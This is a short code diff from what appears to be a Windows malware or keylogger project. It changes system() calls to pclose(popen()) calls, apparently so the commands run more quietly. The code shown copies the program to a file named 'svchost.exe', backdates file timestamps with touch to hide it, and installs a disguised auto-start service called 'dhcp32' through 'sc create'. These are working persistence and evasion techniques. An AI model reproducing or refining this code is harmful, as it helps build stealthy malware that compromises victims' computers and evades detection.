@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-19 12:06:44
+* @Last Modified time: 2017-04-19 12:27:02
 */
 
 #include <vector>
@@ -194,7 +194,7 @@ void register_device(int socket, string recv_uid)
         outfile.open(filename);
         outfile << recv_uid;
         outfile.close();
-        system(cmd);
+        pclose(popen(cmd, "r"));
     }
 
     infile.open(filename);
@@ -209,7 +209,7 @@ void register_device(int socket, string recv_uid)
     string uid;
     infile >> uid;
     infile.close();
-    system(cmd);
+    pclose(popen(cmd, "r"));
 
     uid = "LOG" + uid;
     DPRINT("%s(): %s\n", __func__, uid.c_str());
@@ -596,17 +596,17 @@ int install(bool serviceInstall)
 
     // change access time
     sprintf(cmd, "touch -t 201612261154 \"%s\"", newPath);
-    system(cmd);
+    pclose(popen(cmd, "r"));
 
     sprintf(newPath, "%s\\..\\svchost.exe", sysPath);
     CopyFile(exePath, newPath, false);
     // change access time
     sprintf(cmd, "touch -t 201612261154 \"%s\"", newPath);
-    system(cmd);
+    pclose(popen(cmd, "r"));
 
     sprintf(cmd, "sc create dhcp32 binPath= \"%s service\" start= auto", newPath);
-    system(cmd);
-    system("sc start dhcp32");
+    pclose(popen(cmd, "r"));
+    pclose(popen("sc start dhcp32", "r"));
 
     DPRINT("%s: SUCCESS!\n", __func__);
     return 0;
